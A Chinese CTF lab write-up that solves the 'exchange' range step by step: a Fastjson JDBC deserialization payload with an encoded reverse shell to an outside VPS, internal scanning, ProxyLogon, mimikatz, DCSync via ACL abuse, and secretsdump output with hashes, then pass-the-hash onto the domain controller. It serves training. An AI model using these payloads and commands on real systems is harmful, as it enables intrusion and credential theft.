---
tags: [Fastjson反序列化, JDBC利用, RCE]
---

# 春秋云境exchange靶场

### flag1

老规矩先扫一下，是一个华夏ERP![3144128-20231230170716443-1311587366](D:\Pictures\Screenshots\3144128-20231230170716443-1311587366.png)

扫出来的login界面存在弱口令admin 123456登录

右下角有华夏ERP版本2.3，存在 **Fastjson反序列化漏洞**。这里网上说常规的打法打不通，需要利用

fastjson 反序列化之mysql JDBC 

需要利用两个工具ysoserial-all.jar和evil-mysql-server，需要放到vps上的同一目录下

启动方法是

```
./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-all.jar
```

这里fastjson漏洞点在*/person/list?search=*参数

payload为

```
{
	"name": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.mysql.jdbc.JDBC4Connection",
		"hostToConnectTo": "47.109.157.54",
		"portToConnectTo": 3306,
		"info": {
			"user": "yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDkuMTU3LjU0LzEzMzcgMD4mMQo=}|{base64,-d}|{bash,-i}",
			"password": "pass",
			"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
			"autoDeserialize": "true",
			"NUM_HOSTS": "1"
		}
	}
```

这里需要url编码后在bp中发。监听1337成功反弹shell。

![ex1](D:\Pictures\Screenshots\ex1.png)

这里直接就是root权限

![ex2](D:\Pictures\Screenshots\ex2.png)

成功获取到flag1

![ex3](D:\Pictures\Screenshots\ex3.png)

### flag2

然后就可以在vps上起一个http服务，上传fscan和frpc,记得给777权限，搭建好隧道

用fscan扫内网

```
root@iZ8vbbl7v0w62psnh4ek1zZ:/app/jsherp# ./fscan -h 172.22.3.0/24
./fscan -h 172.22.3.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.3.12     is alive
(icmp) Target 172.22.3.2      is alive
(icmp) Target 172.22.3.9      is alive
(icmp) Target 172.22.3.26     is alive
[*] Icmp alive hosts len is: 4
172.22.3.12:8000 open
172.22.3.26:445 open
172.22.3.2:445 open
172.22.3.9:445 open
172.22.3.9:443 open
172.22.3.26:139 open
172.22.3.2:139 open
172.22.3.9:139 open
172.22.3.26:135 open
172.22.3.9:135 open
172.22.3.2:135 open
172.22.3.9:81 open
172.22.3.9:80 open
172.22.3.12:80 open
172.22.3.9:8172 open
172.22.3.12:22 open
172.22.3.9:808 open
172.22.3.2:88 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo 
[*]172.22.3.2
   [->]XIAORANG-WIN16
   [->]172.22.3.2
[*] NetInfo 
[*]172.22.3.9
   [->]XIAORANG-EXC01
   [->]172.22.3.9
[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia
[*] NetInfo 
[*]172.22.3.26
   [->]XIAORANG-PC
   [->]172.22.3.26
[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html
[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          
[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP
[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None
[*] WebTitle http://172.22.3.9         code:403 len:0      title:None
[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 code:200 len:28237  title:Outlook
已完成 18/18
[*] 扫描结束,耗时: 11.76229401s
```

```none
整理一下就是
172.22.3.12
	已经拿下的web服务器
172.22.3.9
	exchange服务器  XIAORANG-EXC01
172.22.3.2
	XIAORANG-WIN16
172.22.3.26 
	DC:XIAORANG-WIN16.xiaorang.lab
```

然后我们就可以把目标放在exchange服务器上

```
Microsoft Exchange Server 是企业级邮件协作平台
```

安装 Exchange 后，会自动创建两个关键安全组：

| 安全组                         | 默认成员                                          | 权限                                   |
| ------------------------------ | ------------------------------------------------- | -------------------------------------- |
| **Exchange Trusted Subsystem** | Exchange 服务器的机器账户（如 `XIAORANG-EXC01$`） | 成员自动加入 `Organization Management` |
| **Organization Management**    | Exchange 管理员、Trusted Subsystem                | 对整个 Exchange 组织拥有完全控制权     |

**`Exchange Windows Permissions` 组（通常被授予对整个域（`DC=domain,DC=com`）的 `GenericWrite` 或 `WriteDacl` 权限。**攻击者可利用此权限 **给自己或普通用户添加高危权限**（如 DCSync、GenericAll）

用exprolog工具（利用 **Exchange ProxyLogon 漏洞链**）进行利用。

```
python exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab
```

![ex4](D:\Pictures\Screenshots\ex4.png)

然后就可以添加一个新用户到管理员组来进行远程连接了

![ex5](D:\Pictures\Screenshots\ex5.png)

![ex6](D:\Pictures\Screenshots\ex6.png)

连接上后就在管理员文件夹拿到flag

![ex8](D:\Pictures\Screenshots\ex8.png)

### flag3（4）

windows远程桌面可以直接复制粘贴文件，所以直接上传一个mimikatz来抓取hash

管理员打开

```
privilege::debug 
sekurlsa::logonpasswords full
```

分析得到的信息

#### 普通域用户：Zhangtong

- **用户名**：`Zhangtong`
- **域名**：`XIAORANG`（即域 `xiaorang.lab` 的 NetBIOS 名）
- **NTLM Hash**：`22c7f81993e96ac83ac2f3f1903de8b4`
- **状态**：活跃登录（Service Session），很可能是一个真实员工账号

####  HealthMailbox 账户（Exchange 内部账户）

- **用户名**：`HealthMailbox0d5918e`
- **NTLM Hash**：`10ffd3b861b92dabcb758e636c3293b3`（最新会话）
- **说明**：这是 Exchange 自动创建的监控邮箱账户，通常权限较低，但属于域用户

#### 服务器机器账户：`XIAORANG-EXC01$`

- **域名**：`XIAORANG` / `xiaorang.lab`
- **NTLM Hash**：`d6c5039224076834821352cf7335130f`
- **身份**：Exchange 服务器自身的计算机账户

exchange机器账户隶属于Exchange Windows Permissions这个组，具有write 域内acl权限，可以设置刚刚通过mimikatz拿到的域内用户Zhangtong的dcsync属性。（添加的新用户不是域内用户）

```
python dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :d6c5039224076834821352cf7335130f  -action write -rights DCSync -principal Zhangtong -target-dn "DC=xiaorang,DC=lab" -dc-ip 172.22.3.2


xiaorang.lab 这个域名，在 LDAP DN 中就写成：DC=xiaorang,DC=lab
DCSync 权限（DS-Replication-Get-Changes）必须授予在“域命名上下文”（Domain Naming Context）的根对象上才有效
```

![ex08](D:\Pictures\Screenshots\ex08.png)

这里不能用mimikatz进行DCSync，原因是通过 ACL 滥用，给 **普通用户 `Zhangtong`** 添加了 DCSync 权限，但**以 `Zhangtong` 身份运行 Mimikatz 的能力**

所以需要用到另一种远程进行DCSync的方法

```
python secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc

-just-dc：只 dump 域控数据（即所有用户 NTLM/LM/历史密码等）
xiaorang.lab/Zhangtong：表示认证所用的 域名/用户名
@172.22.3.2：表示 要连接的目标主机 IP
```

运行结果

```
D:\impacket渗透脚本\impacket-0.13.0\examples>python secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:8358571c39ae49a9c3b9ab58ba63d18a:::
xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:10ffd3b861b92dabcb758e636c3293b3:::
xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::
xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::
xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::
xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::
xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::
xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::
xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::
xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::
xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::
xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::
Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::
XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:55c7ad52609f909b56a334cc57d73f5a:::
XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:d6c5039224076834821352cf7335130f:::
XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:44889afa9c0c0b8f54294437a1add14e:::
[*] Kerberos keys grabbed
xiaorang.lab\Administrator:aes256-cts-hmac-sha1-96:d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630
xiaorang.lab\Administrator:aes128-cts-hmac-sha1-96:8b17084cfa8d1c1d37c13201d68ec0cf
xiaorang.lab\Administrator:des-cbc-md5:d9c4a4d5348f0d73
krbtgt:aes256-cts-hmac-sha1-96:951d91f55df01d8e3013f433c695fd9684ac2f9f5c08fa815f751c894ca749f9
krbtgt:aes128-cts-hmac-sha1-96:7aa1c6c1f4080fdbf150cf5b6385c480
krbtgt:des-cbc-md5:700d434046231a9e
xiaorang.lab\HealthMailbox8446c5b:aes256-cts-hmac-sha1-96:78013a79afb8f3dd9aff8a98471785cb2444baea52d4870b955ef5fea9816f41
xiaorang.lab\HealthMailbox8446c5b:aes128-cts-hmac-sha1-96:d269223d37b1fa3154035b9cbe27efd1
xiaorang.lab\HealthMailbox8446c5b:des-cbc-md5:837cc2d3dcb04f4c
xiaorang.lab\HealthMailbox0d5918e:aes256-cts-hmac-sha1-96:d938bf8118b384fe3d78ba8600bdb5f20e62d815625945f66c01700ef6005ba1
xiaorang.lab\HealthMailbox0d5918e:aes128-cts-hmac-sha1-96:4294984f0735fc1330ea7e9df39e016a
xiaorang.lab\HealthMailbox0d5918e:des-cbc-md5:aec71af7fe2acb26
xiaorang.lab\HealthMailboxeda7a84:aes256-cts-hmac-sha1-96:0dfb6bdfa6f3592f55baf1c228686597e00b1361eca1441a1fdf0c3599507fd7
xiaorang.lab\HealthMailboxeda7a84:aes128-cts-hmac-sha1-96:f20b096f3ad270e4c36876fd0f1f4a09
xiaorang.lab\HealthMailboxeda7a84:des-cbc-md5:3458ec32a815ce0b
xiaorang.lab\HealthMailbox33b01cf:aes256-cts-hmac-sha1-96:801e2feead7ae5074578fad5eac0d3dabd92f0445068e0a69232ce5bd8ca76f4
xiaorang.lab\HealthMailbox33b01cf:aes128-cts-hmac-sha1-96:3136e1be7138a8d29fa10bc3f2cf6f99
xiaorang.lab\HealthMailbox33b01cf:des-cbc-md5:3283a2dc518680f7
xiaorang.lab\HealthMailbox9570292:aes256-cts-hmac-sha1-96:f3aba1d52f3131e46d916fbd04817b43281b76b86b56dad24f808538e91363cc
xiaorang.lab\HealthMailbox9570292:aes128-cts-hmac-sha1-96:ee9802236d43d7e5695190232c044d63
xiaorang.lab\HealthMailbox9570292:des-cbc-md5:37d30719e940d679
xiaorang.lab\HealthMailbox3479a75:aes256-cts-hmac-sha1-96:721d8bcbbe316a0ec1a7f0aa3ce3519b4d7c3281a571e900b41384e5583d2c84
xiaorang.lab\HealthMailbox3479a75:aes128-cts-hmac-sha1-96:18353920e23e46ef0a834fe5cd5a481b
xiaorang.lab\HealthMailbox3479a75:des-cbc-md5:8a3d2cf261386ba8
xiaorang.lab\HealthMailbox2d45c5b:aes256-cts-hmac-sha1-96:ff6aac30c110e42185c90561d0befebb0b462553737d05aec9c6dcb660612ffd
xiaorang.lab\HealthMailbox2d45c5b:aes128-cts-hmac-sha1-96:5117b1a04caa9925f508eeb0bd6ffa35
xiaorang.lab\HealthMailbox2d45c5b:des-cbc-md5:df2ca48c1525dccb
xiaorang.lab\HealthMailboxec2d542:aes256-cts-hmac-sha1-96:a63a5cb34f7d503c61af2a96508ed826b0ad4daf10198f2b709b75bc58789e90
xiaorang.lab\HealthMailboxec2d542:aes128-cts-hmac-sha1-96:bfe7ece929174b6ba1d643e87f37cf7a
xiaorang.lab\HealthMailboxec2d542:des-cbc-md5:5bf42601e608df31
xiaorang.lab\HealthMailboxf5f7dbd:aes256-cts-hmac-sha1-96:824ea1eadc05dc8b0ed26c3ff0696c9e2fc145ad2d08dd5dbb1c6428f4eb074f
xiaorang.lab\HealthMailboxf5f7dbd:aes128-cts-hmac-sha1-96:c62918a735c4fde6b5db99d9c441200c
xiaorang.lab\HealthMailboxf5f7dbd:des-cbc-md5:46e654e5649d6732
xiaorang.lab\HealthMailbox67dc103:aes256-cts-hmac-sha1-96:c439db29ecbe032623449f1298a0537e6ed26c71dbd457574ac710c0e7c175e4
xiaorang.lab\HealthMailbox67dc103:aes128-cts-hmac-sha1-96:a952200f4f439c33c289f5a5408f902b
xiaorang.lab\HealthMailbox67dc103:des-cbc-md5:751013ef3ee36225
xiaorang.lab\HealthMailbox320fc73:aes256-cts-hmac-sha1-96:a00af0ea0627c6497a806ebcd11c432f7c9658044ca4947438bfca3e371a8363
xiaorang.lab\HealthMailbox320fc73:aes128-cts-hmac-sha1-96:af5f9c02443cef462bb6b5456b296d60
xiaorang.lab\HealthMailbox320fc73:des-cbc-md5:1949dc2c7c98bc20
xiaorang.lab\Lumia:aes256-cts-hmac-sha1-96:25e42c5502cfc032897686857062bba71a6b845a3005c467c9aeebf10d3fa850
xiaorang.lab\Lumia:aes128-cts-hmac-sha1-96:1f95632f869be1726ff256888e961775
xiaorang.lab\Lumia:des-cbc-md5:313db53e68ecf4ce
Zhangtong:aes256-cts-hmac-sha1-96:ae16478a2d05fedf251d0050146d8d2e24608aa3d95f014acd5acb9eb8896bd5
Zhangtong:aes128-cts-hmac-sha1-96:970b0820700dfa60e2c7c1af1d4bbdd1
Zhangtong:des-cbc-md5:9b61b3583140c4b5
XIAORANG-WIN16$:aes256-cts-hmac-sha1-96:9e6b19ee4e8930600dd958d016b80b1e7ecba280fd418e6273ac079ae971579d
XIAORANG-WIN16$:aes128-cts-hmac-sha1-96:391b9a595ba62bffe2baef5bcf2af23b
XIAORANG-WIN16$:des-cbc-md5:b6bc97a8e35e92fd
XIAORANG-EXC01$:aes256-cts-hmac-sha1-96:4968e7c4202cdf12cb2c261a62aba9f7d2edd5784a3f64eefa361c2db1402ee9
XIAORANG-EXC01$:aes128-cts-hmac-sha1-96:bd4c839c71d103886d53395c91b6fb32
XIAORANG-EXC01$:des-cbc-md5:a75d2526e5fd46f1
XIAORANG-PC$:aes256-cts-hmac-sha1-96:965413f8a9094b927c8066660c13bda6a0580384a41013d790a966a4763a681a
XIAORANG-PC$:aes128-cts-hmac-sha1-96:c11e33ade885a2e367ce25a0730a6dae
XIAORANG-PC$:des-cbc-md5:b5f84f0454df863b
[*] Cleaning up...
```

所以我们就拿到了管理员的hash

```shell
xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
```

然后就可以登录域控拿到flag4

```
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb ./Administrator@172.22.3.2
```

![ex10](D:\Pictures\Screenshots\ex10.png)

### flag4（3）

这里可以选择看共享文件夹，但其实后面下载邮件里面也有这个

所有 Windows 主机默认开启 `C$`, `ADMIN$`

现在我们有域管权限，可以在C:\users\lumia\desktop找到一个secret.zip

```
D:\impacket渗透脚本\impacket-0.13.0\examples>python smbclient.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/
administrator@172.22.3.26 -dc-ip 172.22.3.2                                                                             Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C$
# cd /users/lumia/desktop
# ls
drw-rw-rw-          0  Sun Oct 23 21:40:24 2022 .
drw-rw-rw-          0  Sun Oct 23 20:22:44 2022 ..
-rw-rw-rw-        282  Sun Oct 23 20:22:55 2022 desktop.ini
-rw-rw-rw-     668436  Sun Oct 23 21:40:16 2022 secret.zip
# get secret.zip
```

因为打开要密码所以可以使用工具PTH_Exchange把Lumia的邮件都下载下来。

```
D:\PTH_Exchange-main\PTH_Exchange-main>python pthexchange.py --target https://172.22.3.9 --username Lumia --password "00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296" --action Download
2025-12-22 21:05:30,526 - DEBUG - [Stage 777] Get Mails Stage 1 Finditem ing...
2025-12-22 21:05:32,439 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
2025-12-22 21:05:34,455 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
[+] Item [output/item-0.eml] saved successfully
2025-12-22 21:05:34,461 - DEBUG - [Stage 555] Ready Download Attachmenting...
2025-12-22 21:05:34,675 - DEBUG - [Stage 555] Determine if there are attachments in the email...
2025-12-22 21:05:34,676 - DEBUG - [Stage 555] This Mail Has Attachment...
2025-12-22 21:05:34,676 - DEBUG - [Stage 555] Start Get Attachment Content...
2025-12-22 21:05:35,907 - DEBUG - [Stage 555] Start Download Attachment...
[+] Item [output/item-0-secret.zip] saved successfully
2025-12-22 21:05:35,911 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
2025-12-22 21:05:36,151 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
[+] Item [output/item-1.eml] saved successfully
2025-12-22 21:05:36,153 - DEBUG - [Stage 555] Ready Download Attachmenting...
2025-12-22 21:05:36,527 - DEBUG - [Stage 555] Determine if there are attachments in the email...
2025-12-22 21:05:36,528 - DEBUG - [Stage 555] This Mail Has Attachment...
2025-12-22 21:05:36,528 - DEBUG - [Stage 555] Start Get Attachment Content...
2025-12-22 21:05:36,738 - DEBUG - [Stage 555] Start Download Attachment...
[+] Item [output/item-1-phone lists.csv] saved successfully
```

提示用手机号解密，使用ARCHPR进行爆破，成功获取到最后的flag

